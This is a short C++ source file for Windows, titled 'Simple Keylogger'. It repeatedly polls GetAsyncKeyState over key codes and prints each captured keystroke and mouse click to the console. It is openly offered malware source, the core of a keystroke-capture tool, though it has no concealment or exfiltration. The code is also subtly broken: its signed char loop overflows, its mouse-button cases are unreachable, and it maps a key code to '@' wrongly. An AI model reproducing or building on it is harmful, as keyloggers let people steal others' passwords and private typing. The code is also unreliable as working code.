//Simple Keylogger
#include <stdio.h>
#include <iostream>
#include <conio.h>
#include <winuser.h>
#include <windows.h>
#include <string>

using namespace std;

void ezprint(string str)
{
    cout << str << endl;
}

int main()
{
    char key;
    while (TRUE)
    {
        for (key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                switch (key)
                {
                case 8:
                    ezprint("<Backspace>");
                    break;
                case 32:
                    ezprint("<Space>");
                    break;
                case VK_SHIFT:
                    ezprint("<Shift>");
                    break;
                case VK_LBUTTON:
                    ezprint("<Left Click>");
                    break;
                case VK_RBUTTON:
                    ezprint("<Right Click>");
                    break;
                case 64:
                    ezprint("@");
                    break;
                default:
                    cout << key << endl;
                }
            }
        }
    }
}
